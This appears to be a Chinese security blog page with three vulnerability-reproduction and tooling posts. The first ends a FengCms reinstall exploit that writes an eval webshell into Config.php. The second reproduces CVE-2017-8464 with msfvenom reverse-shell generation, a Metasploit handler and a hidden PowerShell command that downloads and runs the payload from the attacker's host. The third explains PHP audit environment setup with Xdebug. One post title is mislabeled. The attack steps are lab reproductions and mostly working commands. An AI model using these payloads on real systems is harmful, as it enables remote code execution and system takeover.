<h4 id="步骤2：验证漏洞"><a href="#步骤2：验证漏洞" class="headerlink" title="步骤2：验证漏洞"></a>步骤2：验证漏洞</h4><p><strong>注：如果点击确定后页面立即跳到首页，这时因为服务器配置高响应过快，在真实的场景中相应速度会很慢，足够我们输入相关的内容，这里将upload下INSTALL文件删除即可</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/install/index.php</span><br></pre></td></tr></table></figure>
<p>上述地址是FengCms的安装地址，打开后我们发现系统提示需要删除INSTALL文件，才可安装，通过上一步代码分析，我们得知，此处只是弹窗警示，程序代码仍然会继续执行下去，因此点击确定：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/51cc51fkJa.png?imageslim" alt="mark"></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/1HkJ57GBcd.png?imageslim" alt="mark"></p>
<p>当点击下一步之后，就安装成功了，将Payload插入到了Config.php文件中。</p>
<p>接下来访问<code>127.0.0.1</code> ，使用Post方式提交数据<code>a=phpinfo();</code> </p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180401/BEFJJ544k3.png?imageslim" alt="mark"></p>
<p>。。。</p>
<p>成功利用了FengCms重装漏洞。</p>
<p><strong>修复建议</strong></p>
<ul>
<li>升级最新版本</li>
<li>在Post写入时，严格增加过滤</li>
<li>验证INSTALL文件是否存在，如果存在则跳出安装流程</li>
</ul>
<p>参考：FengCms1.32系统重装漏洞导致getshell - 知道创宇 Seebug 漏洞平台<br><a href="https://www.seebug.org/vuldb/ssvid-93224" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-93224</a></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/16/Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464/">PHP代码审计环境搭建</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/16/Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464/" class="article-date">
	  <time datetime="2017-10-16T09:52:08.000Z" itemprop="datePublished">2017-10-16</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）"><a href="#Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）" class="headerlink" title="Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）"></a>Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）</h1><h2 id="漏洞实验原理"><a href="#漏洞实验原理" class="headerlink" title="漏洞实验原理"></a>漏洞实验原理</h2><p>&emsp;&emsp;攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名 。震网三代”LNK文件远程代码执行漏洞（CVE-2017-8464）可以用于穿透物理隔离网络。 </p>
<p><strong>漏洞影响范围:</strong></p>
<p>Windows 7</p>
<p>Windows 8.1</p>
<p>Windows RT 8.1</p>
<p>Windows 10</p>
<p>Windows Server 2008</p>
<p>Windows Server 2008 R2</p>
<p>Windows Server 2012</p>
<p>Windows Server 2012 R2</p>
<p>Windows Server 2016</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-漏洞验证"><a href="#第一步-漏洞验证" class="headerlink" title="第一步 漏洞验证"></a>第一步 漏洞验证</h3><p>msfvenom生成 powershell对应payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p  windows/x64/meterpreter/reverse_tcp lhost=192.168.0.11 [攻击机IP地址] -f  psh-reflection&gt;payload.ps1</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/hi5gLDca4i.png?imageslim" alt="mark"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/KLFj78D5ba.png?imageslim" alt="mark"></p>
<p>输入密码360College</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv payload.ps1 /var/www/html</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/g7cafhlcdk.png?imageslim" alt="mark"></p>
<p>启动apache服务器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line"></span><br><span class="line">service apache2 status</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/bEkG291m2d.png?imageslim" alt="mark"></p>
<h3 id="第二步-msf监听"><a href="#第二步-msf监听" class="headerlink" title="第二步 msf监听"></a>第二步 msf监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost  192.168.0.11 [攻击机IP地址]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/Fc0Dm9L1m7.png?imageslim" alt="mark"></p>
<h3 id="第三步-靶机上钩"><a href="#第三步-靶机上钩" class="headerlink" title="第三步 靶机上钩"></a>第三步 靶机上钩</h3><p>登录靶机，在靶机上验证。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/E1I8B7e4e7.png?imageslim" alt="mark"></p>
<p>在靶机桌面上新建快捷方式 ，插入对象的位置：</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/6dCd9I6i4l.png?imageslim" alt="mark"></p>
<p>插入以下代码。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/k36iJkcHFg.png?imageslim" alt="mark"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -windowstyle hidden -exec bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.0.11/payload.ps1‘);test.ps1"</span></span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/CJEELCB4cB.png?imageslim" alt="mark"></p>
<p>再点击完成。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload.exe</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/g2hbh5Ic7I.png?imageslim" alt="mark"></p>
<p>点击payload.exe。</p>
<p>在攻击机上可看到漏洞利用成功：</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180729/g2DeG2Lf3k.png?imageslim" alt="mark"></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-代码审计环境搭建"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/16/代码审计环境搭建/">PHP代码审计环境搭建</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/16/代码审计环境搭建/" class="article-date">
	  <time datetime="2017-10-16T09:52:08.000Z" itemprop="datePublished">2017-10-16</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PHP代码审计环境搭建"><a href="#PHP代码审计环境搭建" class="headerlink" title="PHP代码审计环境搭建"></a>PHP代码审计环境搭建</h1><h2 id="0x00-环境准备"><a href="#0x00-环境准备" class="headerlink" title="0x00 环境准备"></a>0x00 环境准备</h2><p>俗话说：工欲善其事必先利其器，高效的代码审计需要必要的工具支持。</p>
<h4 id="1、PHP环境"><a href="#1、PHP环境" class="headerlink" title="1、PHP环境"></a>1、PHP环境</h4><ul>
<li>PHP集成开发环境：<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpStudy</a><ul>
<li>phpStudy是Windows下一个PHP调试环境的程序集成包。该程序包集成Apache+Nginx+LightTPD+PHP+MySQL+phpMyAdmin+Zend Optimizer+Zend Loader 一次性安装，无须配置即可使用。</li>
</ul>
</li>
</ul>
<h4 id="2、通用工具"><a href="#2、通用工具" class="headerlink" title="2、通用工具"></a>2、通用工具</h4><ul>
<li><p>IDE ： <a href="http://www.jetbrains.com/phpstorm/" target="_blank" rel="noopener">PhpStorm</a></p>
<ul>
<li>PhpStorm是 JetBrains 公司开发的一款商用 PHP 集成开发工具 。</li>
</ul>
</li>
<li><p>代码编辑器 ：<a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text</a></p>
<ul>
<li>Sublime Text一个代码编辑器 ，由程序员Jon Skinner于2008年1月份所开发出来，Sublime Text 具有漂亮的用户界面和强大的功能。</li>
</ul>
</li>
<li><p>网络调试工具： <a href="https://www.getpostman.com/" target="_blank" rel="noopener">Postman</a></p>
<ul>
<li>调试简单的css、html、脚本等简单的网页基本信息，发送所有类型的HTTP请求，调试WEB API的首选工具。</li>
</ul>
</li>
<li><p>Xdebug工具 ：<a href="https://xdebug.org/" target="_blank" rel="noopener">xdebug</a></p>
<ul>
<li>Xdebug是PHP的扩展，用于协助调试和开发。它包含一个用于IDE 的单步调试器 。</li>
</ul>
</li>
<li><p><a href="https://portswigger.net/burp/" target="_blank" rel="noopener">burpsuite </a>（神器不解释）</p>
</li>
</ul>
<h4 id="3、自动化代码审计工具："><a href="#3、自动化代码审计工具：" class="headerlink" title="3、自动化代码审计工具："></a>3、自动化代码审计工具：</h4><ul>
<li><p>Seay源代码审计系统（mysql 监控工具）</p>
<ul>
<li>国人开发的一套PHP源代码审计工具。</li>
</ul>
</li>
<li><p><a href="http://cobra.feei.cn/installation" target="_blank" rel="noopener">cobra</a> ：支持多语言审计，暂时不支持Windows平台。</p>
</li>
<li><p><a href="http://rips-scanner.sourceforge.net/" target="_blank" rel="noopener">RIPS</a>：free PHP security scanner using static code analysis：</p>
</li>
</ul>
<h2 id="0x01-PHP-环境安装"><a href="#0x01-PHP-环境安装" class="headerlink" title="0x01 PHP 环境安装"></a>0x01 PHP 环境安装</h2><p>1、选择解压目录为 C:\phpStudy。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/87ieiL8g3j.png?imageslim" alt="mark"></p>
<p>2、如图所示，phpStudy的目录结构。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/KimDb880Im.png?imageslim" alt="mark"></p>
<p>3 、如果需要Visual C++ 运行库（Visual C++ Redistributable），可到微软官网下载。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/BAmHJidLah.png?imageslim" alt="mark"></p>
<p>下载Visual C++ Redistributable for Visual Studio 2015。选择操作系统对应的位数。</p>
<p><a href="http://www.microsoft.com/zh-cn/download/details.aspx?id=48145" target="_blank" rel="noopener">http://www.microsoft.com/zh-cn/download/details.aspx?id=48145</a></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/mH77gccdDd.png?imageslim" alt="mark"></p>
<p>进行安装。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/4fGIA49a47.png?imageslim" alt="mark"></p>
<p>4、点击启动按钮可以看到phpStudy 已经成功启动。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/3iJLCDmADg.png?imageslim" alt="mark"></p>
<p>5、点击MySQL管理器，我们常用MySQL-Front管理Mysql数据库。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/EeDdE38jaF.png?imageslim" alt="mark"></p>
<p>6、 可以根据需要切换PHP对应版本。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/eK75kaedJA.png?imageslim" alt="mark"></p>
<p>7、在 “其他选项管理器”，可以看到常见的一些使用的工具与常见的快捷按钮。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/H4jahfLcFH.png?imageslim" alt="mark"></p>
<p>8、 点击“ My HomePage”</p>
<p>在浏览器中可看到，环境正常。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/FFeKjJBb2k.png?imageslim" alt="mark">9、点击程序后可以，phpStudy 后台运行服务。可在屏幕右下角找到。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/aD9Cj8l3Ah.png?imageslim" alt="mark"></p>
<p>10、 成功安装phpStudy集成环境，下面安装配置PHP代码调试环境。</p>
<h2 id="0x02-通用工具安装配置"><a href="#0x02-通用工具安装配置" class="headerlink" title="0x02 通用工具安装配置"></a>0x02 通用工具安装配置</h2><h3 id="1、安装配置PhpStorm"><a href="#1、安装配置PhpStorm" class="headerlink" title="1、安装配置PhpStorm"></a>1、安装配置<a href="http://www.jetbrains.com/phpstorm/" target="_blank" rel="noopener">PhpStorm</a></h3><p>下载好phpstorm安装程序打开，根据提示，下一步即可安装。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/AcFCcD9Abf.png?imageslim" alt="mark"></p>
<p>可以看到我们可以选择使用32位与64位版本的phpstorm。在这里要勾选下载JRE，可以自动下载安装JRE程序，点击下一步。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/g08JG1ceFB.png?imageslim" alt="mark"></p>
<p>安装完成启动。</p>
<p>可以选择激活和30试用,在这里我们选择30天试用。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/3lDgaJIFk7.png?imageslim" alt="mark"></p>
<p>点击“Accept”</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/HD09BAJDmG.png?imageslim" alt="mark"></p>
<p>可以看到PhpStorm正常启动。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/5IiBL2abBa.png?imageslim" alt="mark"></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/j53hcCmf3C.png?imageslim" alt="mark"></p>
<h3 id="2、安装配置-Sublime-text"><a href="#2、安装配置-Sublime-text" class="headerlink" title="2、安装配置 Sublime text"></a>2、安装配置 <a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text</a></h3><p>安装 <a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text</a> ,一路next即可。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/kLgJk1EGE4.png?imageslim" alt="mark"></p>
<p>这里需要Python环境。安装Python3.6</p>
<p><a href="https://www.python.org/downloads/windows/" target="_blank" rel="noopener">https://www.python.org/downloads/windows/</a></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/b4I82F0ihk.png?imageslim" alt="mark"></p>
<p>安装 Python3.6，勾选添加Python环境变量，点击”Install Now “。即开始安装。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/6hgDDKGhm3.png?imageslim" alt="mark"></p>
<p>可以看到成功安装Python环境。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/I2fme05i82.png?imageslim" alt="mark"></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/6LdEga51aB.png?imageslim" alt="mark"></p>
<p>在<a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime text </a>Package Control组件在线安装</p>
<ul>
<li>按Ctrl+`调出console（注：避免热键冲突）</li>
<li>粘贴以下代码到命令行并回车：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request,os; pf = <span class="string">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), <span class="string">'wb'</span>).write(urllib.request.urlopen( <span class="string">'http://sublime.wbond.net/'</span> + pf.replace(<span class="string">' '</span>,<span class="string">'%20'</span>)).read())</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/h6DKHIBckE.png?imageslim" alt="mark"></p>
<p>​    重启Sublime Text 3。</p>
<p>​    如果在Perferences-&gt;package settings中看到package control这一项，则安装成功。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/Kc0cDck83e.png?imageslim" alt="mark"></p>
<p>接下来可以安装一些插件。</p>
<h3 id="3、安装Postman"><a href="#3、安装Postman" class="headerlink" title="3、安装Postman"></a>3、安装Postman</h3><p>下一步下一步即可，没什么可注意的的地方。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/74lh0558Ld.png?imageslim" alt="mark"></p>
<h2 id="0x03-本地代码调试环境搭建"><a href="#0x03-本地代码调试环境搭建" class="headerlink" title="0x03  本地代码调试环境搭建"></a>0x03  本地代码调试环境搭建</h2><h3 id="1、安装-xdebug"><a href="#1、安装-xdebug" class="headerlink" title="1、安装  xdebug"></a>1、安装  <a href="https://xdebug.org/" target="_blank" rel="noopener">xdebug</a></h3><p>xdebug 网站：<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">https://xdebug.org/wizard.php</a></p>
<h4 id="（1）下载对应操作系统和PHP版本的xdebug-库文件"><a href="#（1）下载对应操作系统和PHP版本的xdebug-库文件" class="headerlink" title="（1）下载对应操作系统和PHP版本的xdebug 库文件"></a>（1）下载对应操作系统和PHP版本的xdebug 库文件</h4><p><strong>需要特别注意的是需要下载对应操作系统和PHP版本的xdebug 库文件</strong>。phpStudy在查看phpinfo，可知php的各种参数。</p>
<p><img src="C:\Users\shackle\AppData\Local\Temp\1533271285872.png" alt="1533271285872"></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/H8kJi2bhii.png?imageslim" alt="mark"></p>
<p>在官网上提供了一个推荐下载的方式。复制phpinfo 内容到以下这个网站粘贴上去。就可以得到链接下载。<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">https://xdebug.org/wizard.php</a>   <strong>目前这种方法只支持PHP大于7的版本。</strong></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/aHjGm98JLm.png?imageslim" alt="mark"></p>
<p>如下图所示，可以看到下载链接。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/eaEmJB5a5C.png?imageslim" alt="mark"></p>
<p>我们再刷新一下phpinfo。 可以看到，搜索xdebug成功安装上去。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180803/hH31cbgfaj.png?imageslim" alt="mark"></p>
<p>如果 PHP 版本小于7那么就要到<a href="https://xdebug.org/download.php，手动下载需要的版本文件。" target="_blank" rel="noopener">https://xdebug.org/download.php，手动下载需要的版本文件。</a></p>
<h4 id="（2）编辑php-ini"><a href="#（2）编辑php-ini" class="headerlink" title="（2）编辑php-ini"></a>（2）编辑php-ini</h4><p>可通过快捷方式打开，也可以进去其目录编辑php.ini文件。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/aEF5D5AG1I.png?imageslim" alt="mark"></p>
<p>在php.ini文件最后面加上xdebug配置内容。 需要根据自己的环境修改</p>
<ul>
<li>zend_extension设置自己环境的xdebug.dll文件绝对路径。</li>
<li>这里设置的监听的端口（xdebug.remote_port）是9001，下面步骤中使用9001端口配置。 </li>
<li>idekey为360college。其他默认即可。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[xdebug]</span><br><span class="line">；xdebug.dll文件路径</span><br><span class="line">zend_extension =&quot;C:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug-2.5.5-5.6-vc11-nts.dll&quot;</span><br><span class="line"></span><br><span class="line">;运行远程调试</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">;启用性能检测分析</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">;启用代码自动跟踪</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.profiler_output_name = cachegrind.out.%t.%p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;配置端口和监听的域名</span><br><span class="line">xdebug.remote_port=9001</span><br><span class="line">xdebug.remote_host=&quot;localhost&quot;</span><br><span class="line"></span><br><span class="line">xdebug.idekey= &quot;360college&quot;</span><br></pre></td></tr></table></figure>
<h3 id="2、-PHPstorm配置"><a href="#2、-PHPstorm配置" class="headerlink" title="2、 PHPstorm配置"></a>2、 PHPstorm配置</h3><h4 id="（1）打开文件"><a href="#（1）打开文件" class="headerlink" title="（1）打开文件"></a>（1）打开文件</h4><p>点击open，打开需要调试的PHP文件。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/834hK3bEGA.png?imageslim" alt="mark"></p>
<p>选择php文件目录。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/7f9imFEDm7.png?imageslim" alt="mark"></p>
<h4 id="（2）设置PHP环境"><a href="#（2）设置PHP环境" class="headerlink" title="（2）设置PHP环境"></a>（2）设置PHP环境</h4><p>在File中打开Settings，配置设置。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/412i5FjcFm.png?imageslim" alt="mark"></p>
<p>在设置界面中的PHP选项中添加PHP环境，即为我们之前设置的网站运行的PHP环境。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/aIIL4l0JfF.png?imageslim" alt="mark"></p>
<p>编辑所需要的选项。</p>
<p><img src="C:\Users\shackle\AppData\Local\Temp\1533364142489.png" alt="1533364142489"></p>
<h4 id="（3）配置Debug"><a href="#（3）配置Debug" class="headerlink" title="（3）配置Debug"></a>（3）配置Debug</h4><p>在file-&gt;settings-&gt;Languages &amp; Frameworks-&gt;PHP ，选择Debug，设置监听的端口，要和之配置的端口一样。这里配置的是9001。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/4DImBIa2bI.png?imageslim" alt="mark"></p>
<p>还要设置DBGp Proxy 如下：端口同样为9001，key为之前设置的360college。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/7LlC4geibh.png?imageslim" alt="mark"></p>
<h4 id="（4）配置-Server"><a href="#（4）配置-Server" class="headerlink" title="（4）配置 Server"></a>（4）配置 Server</h4><p>在File-&gt;settings-&gt;Languages Frameworks-&gt;PHP 中设置Server。新建Server，设置Name为需要名字，Host设置为localhost，端口等根据环境设置。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/8Ij1G0HLal.png?imageslim" alt="mark"></p>
<h4 id="（5）配置调试选项"><a href="#（5）配置调试选项" class="headerlink" title="（5）配置调试选项"></a>（5）配置调试选项</h4><p>在Run/Debug Configurations中新建PHP web Page。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/HF2EFdKB7J.png?imageslim" alt="mark"></p>
<p>设置Name，选择server 为之前设置的server，根据环境设置Start URL结构。</p>
<p>点击箭头所示Validate验证配置是否正确。如下为正确。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/lDblk9g17f.png?imageslim" alt="mark"></p>
<h4 id="（6）开始调试"><a href="#（6）开始调试" class="headerlink" title="（6）开始调试"></a>（6）开始调试</h4><p>​    在index.php文件中点击，打上断点。点击像小虫子一样的图标开始调试。可以看到弹出浏览器界面，调试开始。界面下方看到，调试参数。接下来可以进行代码走查，单步多部执行。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/KlJl260a2d.png?imageslim" alt="mark"></p>
<p>执行调试，看到变量变化情况。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/2KLJ8kG1lm.png?imageslim" alt="mark"></p>
<h3 id="3、-浏览器插件"><a href="#3、-浏览器插件" class="headerlink" title="3、 浏览器插件"></a>3、 浏览器插件</h3><p><a href="https://confluence.jetbrains.com/display/PhpStorm/Browser+Debugging+Extensions" target="_blank" rel="noopener">https://confluence.jetbrains.com/display/PhpStorm/Browser+Debugging+Extensions</a></p>
<p><a href="https://addons.mozilla.org/zh-CN/firefox/addon/the-easiest-xdebug/" target="_blank" rel="noopener">https://addons.mozilla.org/zh-CN/firefox/addon/the-easiest-xdebug/</a></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180805/2f1kGE510a.png?imageslim" alt="mark"></p>
<p>编码设置：</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180805/29f0B8Fkdc.png?imageslim" alt="mark"></p>
<h2 id="0x04-远程代码调试环境搭建"><a href="#0x04-远程代码调试环境搭建" class="headerlink" title="0x04  远程代码调试环境搭建"></a>0x04  远程代码调试环境搭建</h2><h4 id="1、-PHP中配置xdebug"><a href="#1、-PHP中配置xdebug" class="headerlink" title="1、 PHP中配置xdebug"></a>1、 PHP中配置xdebug</h4><p>下载xdebug文件。</p>
<p>PHP.ini 文件根据环境添加以下内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension =&quot;D:\phpStudy2018\PHPTutorial\php\php-5.4.45-nts\ext\php_xdebug-2.4.1-5.4-vc9-nts-x86_64.dll&quot;</span><br><span class="line"></span><br><span class="line">;运行远程调试</span><br><span class="line">xdebug.remote_enable = On</span><br><span class="line">;启用性能检测分析</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">;启用代码自动跟踪</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.profiler_output_name = cachegrind.out.%t.%p</span><br><span class="line"></span><br><span class="line">;如果配置该项就不需要配xdebug.remote_host</span><br><span class="line">xdebug.remote_connect_back=1</span><br><span class="line"></span><br><span class="line">;配置端口和监听的域名</span><br><span class="line">xdebug.remote_port=9101</span><br><span class="line"></span><br><span class="line">;xdebug.remote_host=&quot;localhost&quot;</span><br><span class="line">;配置id key</span><br><span class="line">xdebug.idekey= &quot;360college&quot;</span><br></pre></td></tr></table></figure>
<h4 id="2、-PhpStorm配置"><a href="#2、-PhpStorm配置" class="headerlink" title="2、 PhpStorm配置"></a>2、 PhpStorm配置</h4><h4 id="（1）SFTP同步代码"><a href="#（1）SFTP同步代码" class="headerlink" title="（1）SFTP同步代码"></a>（1）SFTP同步代码</h4><p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/6ej12BDa8K.png?imageslim" alt="mark"></p>
<p>通过FTP/SFTP/FTPS下载服务器需要调试的代码，按照下图提示，下一步下一步进行配置。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/l7cd8HJGkE.png?imageslim" alt="mark"></p>
<p>创建新的工程，工程名字根据需求填写。选择工程的目录路径。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/FmIEJDjjdC.png?imageslim" alt="mark"></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/LJECCJlmi2.png?imageslim" alt="mark"></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180804/4gBj8B1Cgd.png?imageslim" alt="mark"></p>
